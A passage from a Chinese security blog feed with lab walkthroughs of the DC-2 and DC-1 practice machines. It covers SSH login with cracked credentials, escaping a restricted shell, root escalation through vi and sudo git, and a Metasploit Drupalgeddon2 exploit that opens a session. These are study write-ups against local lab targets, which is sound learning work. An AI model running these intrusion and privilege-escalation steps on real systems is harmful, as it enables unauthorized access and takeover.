src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629191506509.png" alt="image-20240629191506509"></p><p>点进去查看其内容：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629191548650.png" alt="image-20240629191548650"></p><blockquote><p>If you can’t exploit WordPress and take a shortcut, there is another way.</p><p>Hope you found another entry point.</p><p>如果你不能利用WordPress走捷径，还有另一种方法。</p><p>希望你能找到另一个入口。</p></blockquote><p>此提示也验证了之前我们试图通过Metasploit进行WordPress漏洞的利用是行不通的。</p><p>再来捋一下，我们目前已经获取了用于登陆的两个用户名和密码。且已经明确了无法通过漏洞利用进行 Getshell 以及提权。</p><p>所以我们接下来可以尝试使用已获取的用户密码连接服务器！</p><h2 id="ssh连接"><a href="#ssh连接" class="headerlink" title="ssh连接"></a>ssh连接</h2><p>由前面的端口扫描可知，目标靶机开放的端口只有两个<code>80</code>端口和<code>7744</code>端口。</p><p>80端口常用于web网页http服务。代表http协议。通过上述操作，通过网页操作能获得的信息几近尽头。所以我们从7744端口进行切入。由提示信息，7744端口代表的是ssh协议，用于远程服务器连接。</p><p>跟自己远程连接kali的操作类似，只不过这里指定了7744端口：</p><ul><li>对 jerry 账号进行尝试</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh jerry@192.168.204.131 -p 7744<br></code></pre></td></tr></table></figure><p>但尝试后发现，无论是手打还是复制粘贴，请求都被拒绝了，因此排除密码输入错误的情况。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629192912615.png" alt="image-20240629192912615"></p><ul><li>对 tom 账号进行尝试</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh tom@192.168.204.131 -p 7744<br></code></pre></td></tr></table></figure><p>ok！成功登陆上了！</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629193140246.png" alt="image-20240629193140246"></p><p>连上之后先 <code>ls</code>查看用户下的目录文件：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629200237330.png" alt="image-20240629200237330"></p><p>只有flag3文件，usr是系统资源文件，没啥太大的参考意义。</p><p><code>cat flag3.txt</code>查看文件内容，发现没有找到<code>cat</code>命令，判定为命令限制。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629201414849.png" alt="image-20240629201414849"></p><p>使用指令查看能够使用的命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">compgen -c<br></code></pre></td></tr></table></figure><p>结果如下：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629201941121.png" alt="image-20240629201941121"></p><p>有很多命令捏，在末尾处有一个常见的linux文件操作指令<code>vi</code></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629202023822.png" alt="image-20240629202023822"></p><p>使用 vi 打开 flag3.txt 文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vi flag3.txt<br></code></pre></td></tr></table></figure><p>权限不够，提示要提权：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629202509198.png" alt="image-20240629202509198"></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>根据 flag3.txt 文件的提示，我们应该实现<strong>提权</strong>操作。根据上述<code>compgen -c</code>得到的命令信息，<code>vi</code>是linux下常见的文件操作命令。而且vi是vim的先前版本。通过网络搜索得知，vim能够用来实现提权。</p><blockquote><p>vim的主要用途是作为文本编辑器，但若其作为SUID运行，它将继承root用户的权限，因此它可以读取系统上的所有文件。</p><p>vim.tiny &#x2F;etc&#x2F;shadow 访问高密级文件</p><p>还可以通过vim打开shell</p><p>vim.tiny</p><p>：set shell&#x3D;&#x2F;bin&#x2F;sh</p><p>：shell</p></blockquote><p>首先，先使用<code>vi</code>命令随机打开一个文件（flag3.txt），然后按照保存长度文件的步骤，先<code>Esc + ：号</code>输入<code>set shell=/bin/sh</code>，回车，然后再<code>：号</code>输入<code>shell</code>点击回车即可。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">：<span class="hljs-built_in">set</span> shell=/bin/sh<br><br>：shell<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629204801206.png" alt="image-20240629204801206"></p><p><code>cd ..</code>返回上一级目录，执行ls的时候发现存在 jerry 和 tom 两个文件夹，可以说是实现了部分提权但仍未获得root用户权限。</p><p>进入jerry文件夹：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> jerry<br><br><span class="hljs-built_in">ls</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629205337373.png" alt="image-20240629205337373"></p><p>可以看到有个 flag4 文件，查看其内容：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vi flag4.txt<br></code></pre></td></tr></table></figure><p>（注意不是<code>cat</code>哦！cat被限制了）</p><p>得到如下信息：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629205603521.png" alt="image-20240629205603521"></p><p>根据提示信息，我们还需要去找到最后一个<code>flag</code>，而且它不给我们提示了。</p><p>接下来尝试<code>rbash绕过</code>来实现提权。</p><table><thead><tr><th align="left">rbash 是 restricted bash 的缩写，意思是受限制的 bash。它与shell的区别在于会限制一些行为，让一些命令无法执行。（本文中cat命令被限制）</th></tr></thead></table><blockquote><ul><li>RBASH 是一种特殊的 shell，它限制了用户的一些操作和权限，例如：<ul><li>不能使用 cd 命令来改变当前目录。</li><li>不能使用 set 命令来改变环境变量或 shell 选项。</li><li>不能使用 unset 命令来取消环境变量或 shell 函数。</li><li>不能使用任何包含 &#x2F; 符号的命令，除非它们在 PATH 环境变量中指定了。</li><li>不能重定向输入或输出，例如使用 &gt;, &lt;, &gt;&gt;, &lt;&lt; 等符号。</li><li>只能执行 PATH 环境变量中指定的命令，而且 PATH 环境变量通常只包含一些基本的命令，例如 ls, cat, echo 等。</li></ul></li><li>RBASH 的目的是为了提高系统的安全性，防止用户执行一些危险或不合法的操作。</li></ul></blockquote><p>学习文档：<a href="https://www.freebuf.com/vuls/376922.html%EF%BC%88Linux%E6%8F%90%E6%9D%83%E4%B9%8Brbash%E7%BB%95%E8%BF%87%EF%BC%89">https://www.freebuf.com/vuls/376922.html（Linux提权之rbash绕过）</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">export</span> -p   // 查看环境变量<br><br>BASH_CMDS[a]=/bin/sh;a  // 把/bin/sh;a这个值赋值给目标数组位置<br><br>执行 /bin/bash 命令 // 退出返回当前普通tom用户<br><br><span class="hljs-built_in">export</span> PATH=<span class="hljs-variable">$PATH</span>:/bin  // 添加环境变量<br><br><span class="hljs-built_in">export</span> PATH=<span class="hljs-variable">$PATH</span>:/usr/bin // 添加环境变量<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629211244365.png" alt="image-20240629211244365"></p><p>添加完环境变量后，<code>ls</code>查看当前目录内容，<code>compgen -c</code>查看当前支持的指令。</p><p>结果显示出了绕过之前<code>compgen -c</code>所没有的很多命令，说明rbash绕过成功。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629212249196.png" alt="image-20240629212249196"></p><p>尝试<code>sudo su</code>提权，但结果还是没能成功。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629212501959.png" alt="image-20240629212501959"></p><p>因此需要继续提权。再仔细查看绕过后系统允许的命令，发现有<code>find</code></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629212610412.png" alt="image-20240629212610412"></p><p>我们上一个靶场利用<code>find</code>命令成功进行了提权，那这次也一样捏！</p><p>首先利用find命令，查看具有SUID权限的可执行二进制文件（命令）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629212859976.png" alt="image-20240629212859976"></p><p>发现好像没啥文件可利用。而上一个靶场中<code>find</code>命令也具有SUID权限。</p><p>尝试切换用户！切换到 jerry账户 ！</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">su &lt;用户名jerry&gt;  // 然后输入jerry的密码即可<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629214309315.png" alt="image-20240629214309315"></p><p><code>sudo -l</code>查看sudo的配置文件</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629214442931.png" alt="image-20240629214442931"></p><p>可以得到的信息是，<code> (root) NOPASSWD: /usr/bin/git</code>git命令是root权限的。</p><p><strong>git命令可以实现提权</strong></p><blockquote><p>方法一：</p><p>sudo git help config</p><p>!&#x2F;bin&#x2F;bash 或 !’sh’</p><p>方法二：</p><p>sudo git -p help</p><p>!&#x2F;bin&#x2F;bash </p></blockquote><p>首先先再用户命令行界面输入 <code>sudo git help config</code>，然后他会跳转到一个文件处，什么都不用管，直接复制<code>!/bin/bash 或 !&#39;sh&#39;</code>然后回车。</p><p>可以发现，现在已经是root用户了。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629220012985.png" alt="image-20240629220012985"></p><p>但是执行<code>ls</code>的时候可以发现，当前目录下仍然只有 flag3 这个文件。根据命令行显示提示，我们是在root下的 &#x2F;home&#x2F;tom目录 执行的 ls 命令。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629215624770.png" alt="image-20240629215624770"></p><p>执行两次 <code>cd ..</code>退回到 root 根目录。然后再执行一次 ls命令，可以得到<code> final-flag.txt</code>文件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> final-flag.txt<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629220312912.png" alt="image-20240629220312912"></p><p>提权成功！</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li><p>第一步工作就是确认目标靶机的IP地址。通过开关靶机或者nmap扫描实现</p></li><li><p>第二步工作就是进行端口扫描，扫描开放端口，试图从中获取一些有用的信息</p></li><li><p>第三步工作就是尝试进行目录爆破。到这一步为止的步骤和dc-1的步骤类似</p></li><li><p>通过<strong>指纹工具</strong>识别出网站使用的框架是<strong>wordpress</strong>，这类框架的漏洞常可以使用<strong>wpscan</strong>进行扫描。使用<strong>wpscan</strong>进行用户名信息扫描。</p></li><li><p>根据<strong>flag提示</strong>得知可以使用<strong>cewl</strong> ，使用其可以针对特定域名（URL）进行密码爆破字典生成。</p></li><li><p>有了<strong>密码字典</strong>以及<strong>用户名信息</strong>之后使用<strong>wpscan</strong>进行有效用户账户的爆破。</p></li><li><p>通过SSH连接来<strong>Getshell</strong>。通过利用可以使用的命令来进行提权，当仍有命令限制的时候，无法获取root权限的时候尝试使用<strong>rbash绕过</strong>来进行提权。</p></li><li><p>切换用户，查看sudo配置信息，试图获取有用信息，<strong>利用命令进行提权</strong>。最后进入root目录查看文件获取最后一个flag。</p></li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>DC-1</title>
    <link href="/2024/07/24/DC-1/"/>
    <url>/2024/07/24/DC-1/</url>
    
    <content type="html"><![CDATA[<h1 id="DC-1"><a href="#DC-1" class="headerlink" title="DC-1"></a><strong>DC-1</strong></h1><p>首先，需要让kali与靶机出于同一个网段，需要将二者都设置成桥接模式（NAT模式），这样kali在进行地址扫描的时候才能够扫除靶机的IP。</p><h2 id="靶机IP地址确认"><a href="#靶机IP地址确认" class="headerlink" title="靶机IP地址确认"></a>靶机IP地址确认</h2><p><strong>（1）可以直接通过vmvare查看DC-1靶机的MAC地址（00:0C:29:E5:19:3C）</strong></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721909942087.png" alt="img"></p><p>在kali中进行地址段扫描：（nmap扫描法）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo nmap -sN 192.168.204.0/24<br></code></pre></td></tr></table></figure><p>扫描得到的结果如下：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721910134252.png" alt="img"></p><p>对比mac地址，得到了靶机的IP地址。其他的地址扫描方法以及得到的效果如下：<br>p1：（arp-scan扫描）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo arp-scan -l<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721910168155.png" alt="img"></p><p>p2：（netdiscover扫描 – 速度很慢）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo netdiscover<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721910333640.png" alt="img"></p><p><strong>（2） 也可以通过开关靶机扫描来确定靶机的IP地址</strong> </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sN 192.168.204.0/24<br></code></pre></td></tr></table></figure><p> 关闭靶机时，扫描得到的结果：<br><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721910370512.png" alt="img"></p><p>打开（或挂起）靶机时，扫描得到的结果：</p><p>会发现多了一个IP地址。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721910301109.png" alt="img"></p><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p><strong>（1）扫描目标靶机IP的开放端口</strong></p><p><code>-sV</code> ：对端口上的服务程序进行扫描，扫描提供服务的版本。</p><p><code>-p </code>： 指定扫描端口，<code>-p- </code>指的是从1到65535端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sV -p- 192.168.204.129<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721910497135.png" alt="img"></p><p><code>-sT</code>：TCP连接扫描，不安全，速度较慢，但相对准确。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sT -p- 192.168.204.129<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721910518883.png" alt="img"></p><p>根据结果可以看到，开放的端口有<code>22、80、111、51393</code></p><p><strong>（2）扫描开放端口的具体信息</strong></p><p><code>-sT</code> ：TCP连接扫描，不安全，速度较慢，但相对准确</p><p><code>-sV</code> ： 对端口上的服务程序进行扫描，扫描提供服务的版本</p><p><code>-sC</code> ：表示使用默认的脚本进行扫描</p><p><code>-O</code> ：扫描操作系统的版本</p><p><code>-p </code>： 指定扫描端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sT -sV -sC -O -p 22,80,111,51393 192.168.204.129<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721910561368.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721910577299.png" alt="img"></p><p>通过80端口呈现出来的信息可以知道，它是一个Drupal网站。</p><p>什么是Drupal呢？通过网上查询，可以知道：</p><table><thead><tr><th align="left">Drupal是一个开源的CMS框架，是一个基于LAMP技术栈的CMS框架，它允许通过安装和卸载模块的方式添加和移除功能。CMS（内容管理系统）是一种软件，允许用户使用各种智能产品中的web浏览器访问网站，添加、发布、编辑和删除内容。</th></tr></thead></table><p>通过<code>searchsploit</code>命令搜索，可以查找到CMS框架的漏洞。</p><table><thead><tr><th align="left">searchsploit是一个用于Exploit-DB的命令行搜索工具。许多漏洞都包含了二进制文件的链接，这些文件不包含在存储库中，但可以在Exploit-DB二进制文件中找到。</th></tr></thead></table><p>输入命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">searchsploit drupal cms<br>searchsploit drupal<br></code></pre></td></tr></table></figure><p>得到如下扫描结果：</p><p>可以看到这类cms框架的漏洞不少。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721910624007.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721910639657.png" alt="img"></p><p>使用浏览器访问靶机IP，显示为一个Drupal网页：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721910712860.png" alt="img"></p><p>再次查看扫描得到的端口信息，可以得知80端口服务器下的文件目录，其中有一个<code>install.php</code>的文件，选择它的原因呢，命名是install，下载文件，如果可以自己重新下载一个，并修改其中的参数，也许下载得到的效果就不一样了（&#x2F;doge）。</p><p>使用浏览器访问该文件，在上述网站网址后面加上<code>/install.php</code>。如下，可以看到一些信息，比如第二个提示”若想下载一个不同的数据库，需要在sites文件夹中适当编辑setting.php文件”</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721910769368.png" alt="img"></p><h2 id="扫描常见UDP端口"><a href="#扫描常见UDP端口" class="headerlink" title="扫描常见UDP端口"></a>扫描常见UDP端口</h2><p><code>--top-ports  n</code>   ： 扫描最常用的n个端口。</p><p>对靶机IP地址进行扫描，扫描其中最常见的20个UDP端口，查看其开放状态，保存信息备用。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo nmap -sU --top-ports 20 192.168.204.129<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721910815582.png" alt="img"></p><h2 id="nmap漏扫"><a href="#nmap漏扫" class="headerlink" title="nmap漏扫"></a>nmap漏扫</h2><p>对靶机进行nmap漏扫：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -script=vuln -p 22,80,111,51393 192.168.204.129<br></code></pre></td></tr></table></figure><blockquote><p>nmap -script&#x3D;vuln -p 是使用Nmap运行漏洞脚本扫描的命令。</p><p>其中“-script&#x3D;vuln”告知nmap要运行漏洞脚本扫描</p></blockquote><p>扫描结果：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721911011291.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721911032733.png" alt="img"></p><p>首先会显示目标主机的IP地址（nmap scan report for targetIP）</p><p>然后会显示扫描过程中检测到的开放的端口号（port    state    service）</p><p>下一个项目就是显示漏洞的检测结果，对于每个开放的端口，显示是否发现了与该端口相关的已知漏洞。如上图扫描结果，关于80端口的漏洞不少。</p><h2 id="gobuster目录爆破"><a href="#gobuster目录爆破" class="headerlink" title="gobuster目录爆破"></a>gobuster目录爆破</h2><table><thead><tr><th align="left">gobuster是一个用于在网站目录或者文件中进行快速且有效的字典攻击工具。它可以帮助发现目标网站中隐藏的路径。执行的功能有：目录扫描、子域名扫描、文件扩展名扫描、多线程支持、结果报告。多用于渗透测试和安全审计中。</th></tr></thead></table><p>执行命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gobuster <span class="hljs-built_in">dir</span> -u http://192.168.204.129 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt<br></code></pre></td></tr></table></figure><p><code>-u</code>：指明待输入的待扫描的网站</p><p><code>-w</code>：指明字典文件的路径</p><p><code>dir</code>：表示使用目录&#x2F;文件枚举模式</p><p>鉴定为：爆破过程太久了啊<del>，不如直接利用漏洞</del></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721911162748.png"></p><p><strong>gobuster常使用的命令和标志：</strong></p><ul><li><p>命令（模式）</p><p><strong>completion</strong>：为指定的shell生成自动完成脚本<br><strong>dir</strong>：使用目录&#x2F;文件枚举模式<br><strong>dns</strong>：使用DNS子域枚举模式<br><strong>fuzz</strong>：使用模糊测试模式。替换URL、Headers和请求体中的关键词FUZZ<br><strong>gcs</strong>：使用gcs bucket枚举模式<br><strong>help</strong>：获取任何命令的帮助信息<br><strong>s3</strong>：使用aws bucket枚举模式<br><strong>tftp</strong>：使用TFTP枚举模式<br><strong>version</strong>：显示当前版本<br><strong>vhost</strong>：使用VHOST枚举模式（您很可能想在URL参数中使用IP地址）</p></li><li><p>标志（全局参数）</p><p><strong>–debug</strong>：启用调试输出<br><strong>–delay duration</strong>：每个线程在请求之间的等待时间（例如1500ms）<br><strong>-h, –help</strong>：获取gobuster的帮助信息<br><strong>–no-color</strong>：禁用彩色输出<br><strong>–no-error</strong>：不显示错误<br><strong>-z, –no-progress</strong>：不显示进度<br><strong>-o, –output string</strong>：写入结果的输出文件（默认为stdout）<br><strong>-p, –pattern string</strong>：包含替换模式的文件<br><strong>-q, –quiet</strong>：不打印横幅和其他无关信息<br><strong>-t, –threads int</strong>：并发线程的数量（默认为10）<br><strong>-v, –verbose</strong>：详细输出（错误）<br><strong>-w, –wordlist string</strong>：指向字典文件的路径。设置为-以使用STDIN。<br><strong>–wordlist-offset int</strong>：从字典文件中的指定位置恢复（默认为0）<br>（原文链接：<a href="https://blog.csdn.net/weixin_70137901/article/details/134613324%EF%BC%89">https://blog.csdn.net/weixin_70137901/article/details/134613324）</a></p></li><li><p>gobuster使用基本语法</p><p><strong>目录扫描：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gobuster <span class="hljs-built_in">dir</span> -w 选择一个字典 -u 输入要扫描的网站 -x 扫描的文件类型 -t 线程数量<br></code></pre></td></tr></table></figure><p><strong>子域名扫描：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gobuster dns -d 域名 -w 字典<br></code></pre></td></tr></table></figure></li></ul><h2 id="Drupal-CMS漏洞查找"><a href="#Drupal-CMS漏洞查找" class="headerlink" title="Drupal CMS漏洞查找"></a>Drupal CMS漏洞查找</h2><p>使用Metasploit查询该CMS漏洞并进行测试。</p><table><thead><tr><th align="left">Metasploit是一款开源渗透测试框架，可以进行信息收集、漏洞扫描、漏洞利用和后渗透攻击。提供了Payload生成器用于生成各种类型的恶意代码，如shellcode、Trojan程序等。还可以通过编写脚本自动化渗透测试过程。</th></tr></thead></table><p>首先打开工具：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">输入命令：msfconsole<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721911217520.png" alt="img"></p><p>输入命令查找Drupal CMS漏洞：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">search Drupal<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721911246290.png" alt="img"></p><p>根据查询结果，可以得知这个Drupal CMS框架还是有蛮多漏洞的。Rank表示漏洞等级。此处利用漏洞等级较高且时间最新的2018年的漏洞。</p><blockquote><p> exploit&#x2F;unix&#x2F;webapp&#x2F;drupal_drupalgeddon2 </p></blockquote><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">use exploit/unix/webapp/drupal_drupalgeddon2<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721911328575.png" alt="img"></p><p>查看该漏洞模块的参数：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">show</span> <span class="hljs-keyword">options</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721911347750.png" alt="img"></p><p>其中，<code>Current Setting </code>是目前设置的内容，<code>Required</code>表示是否需要设置内容，yes为必须，no为可选。</p><p>然后可以看到有一个<code>RHOSTS</code>项目，重置HOST，设置为必须设置。因而接下来需要设置RHOSTS的内容，即攻击目标IP地址。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">set</span> RHOSTS 192.168.204.129<br></code></pre></td></tr></table></figure><p>然后再查看一下模块的参数，确认设置完成：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721911382479.png" alt="img"></p><p>然后执行run&#x2F;exploit命令开始攻击：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">run/exploit<br></code></pre></td></tr></table></figure><p>出现如下提示信息表明攻击成功！</p><p><code>Meterpreter session 1 opened </code></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721911445441.png" alt="img"></p><h2 id="Get-shell"><a href="#Get-shell" class="headerlink" title="Get shell"></a>Get shell</h2><p>利用漏洞攻击目标主机成功之后就可以Getshell获取权限了。</p><h3 id="1、获取普通shell"><a href="#1、获取普通shell" class="headerlink" title="1、获取普通shell"></a>1、获取普通shell</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">shell<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721911471937.png" alt="img"></p><p>然后在上述光标处输入并执行ls命令，获取目标目录下的文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721911485786.png" alt="img"></p><p>通过执行命令可以判断所得到的权限级别：</p><blockquote><p>一般来说，对于用户类型的ID分配为：</p><p>①系统管理员id&#x3D;0；②普通用户id&#x3D;1~65535。</p><p>而且当所获取的权限为系统管理员权限时，执行 <code>whoami</code>显示的用户名是root。</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">id</span><br><br><span class="hljs-built_in">whoami</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721911507274.png" alt="img"></p><p>显然，这里获取的权限是普通用户的权限。尽管只是普通权限， 但我们仍可以通过这些普通权限去获取别的信息。</p><p>- </p><p><strong>使用命令测试是否提权成功，就是切换用户到靶机用户，得到如下效果：</strong></p><p><strong>Pay：这个操作是必要的，不然会导致提权被迫失败。</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">// 利用python的‘pty’模块来生成一个交互式的bash shell<br>python -c <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721911524939.png" alt="img"></p><p>- 